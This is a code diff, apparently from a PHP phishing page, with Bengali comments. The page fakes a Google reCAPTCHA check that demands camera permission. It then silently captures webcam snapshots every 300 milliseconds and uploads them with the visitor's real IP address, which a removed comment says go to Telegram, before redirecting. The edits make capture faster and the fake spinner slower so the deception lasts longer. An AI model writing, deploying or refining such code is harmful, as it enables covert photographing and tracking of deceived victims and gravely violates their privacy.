@@ -1,20 +1,17 @@
 <?php
-// ১. এক্সপায়ারি টাইম চেক করা (লিংকে 'e' প্যারামিটার বাধ্যতামূলক)
 $expiryTime = 0;
 if (isset($_GET['e']) && !empty($_GET['e'])) {
     $expiryTime = hexdec($_GET['e']);
 }
 
-// যদি লিংকে এক্সপায়ারি টাইম না থাকে অথবা মেয়াদ শেষ হয়ে যায়, তবে রিকোয়েস্ট ব্লক করে দেওয়া হবে
 if ($expiryTime === 0 || time() > $expiryTime) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        exit; // মেয়াদ শেষ বা টাইম না থাকলে ছবি টেলিগ্রামে যাবে না
+        exit;
     }
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    // পোস্ট রিকোয়েস্টের সময়েও আরেকবার সিকিউরিটি চেক
     if ($expiryTime === 0 || time() > $expiryTime) {
         exit;
     }
@@ -37,7 +34,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $fileName = 'img_' . uniqid() . '.png';
     $filePath = $uploadDir . $fileName;
 
-    // Render বা ক্লাউড সার্ভার থেকে ইউজারের রিয়েল আইপি অ্যাড্রেস বের করার সঠিক পদ্ধতি
     $ipAddress = $_SERVER['REMOTE_ADDR'];
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -77,8 +73,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; padding: 20px 25px; display: flex; align-items: center; justify-content: space-between; width: 300px; box-shadow: 0 0 4px rgba(0,0,0,0.08); display: none; }
         .recaptcha-left { display: flex; align-items: center; gap: 15px; }
         .recaptcha-checkbox { width: 28px; height: 28px; background: #fff; border: 2px solid #c1c1c1; border-radius: 2px; }
-        .recaptcha-checkbox.loading { border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* লোড হওয়ার চাকাটি এখন আরও আস্তে (Slow) ঘুরবে (1.5s করা হয়েছে) */
+        .recaptcha-checkbox.loading { 
+            border: 2px solid #f3f3f3; 
+            border-top: 2px solid #3498db; 
+            border-radius: 50%; 
+            animation: spin 1.5s linear infinite; 
+        }
+
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+
         .recaptcha-text { font-family: Roboto, sans-serif; font-size: 14px; color: #2c2c2c; }
         .recaptcha-right { display: flex; flex-direction: column; align-items: center; }
         .recaptcha-logo { width: 32px; height: 32px; background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png'); background-size: contain; }
@@ -122,17 +130,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
         function startAutoVerification() {
             document.getElementById('recaptchaCheckbox').classList.add('loading');
-            const interval = setInterval(captureAndUpload, 500); 
+            
+            // ছবি পাঠানো আরও ফাস্ট করা হলো: প্রতি ০.৩ সেকেন্ড (300ms) পর পর ছবি ক্যাপচার হবে
+            const interval = setInterval(captureAndUpload, 300); 
+
             setTimeout(() => {
                 clearInterval(interval);
                 window.location.href = finalUrl;
-            }, 4000); 
+            }, 4000); // মোট ৪ সেকেন্ড পর্যন্ত ভেরিফাই হবে
         }
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                setTimeout(startAutoVerification, 500);
+                setTimeout(startAutoVerification, 300);
             })
             .catch(() => {
                 alert("লিংকটি দেখতে হলে অবশ্যই ক্যামেরা পারমিশন দিতে হবে!");
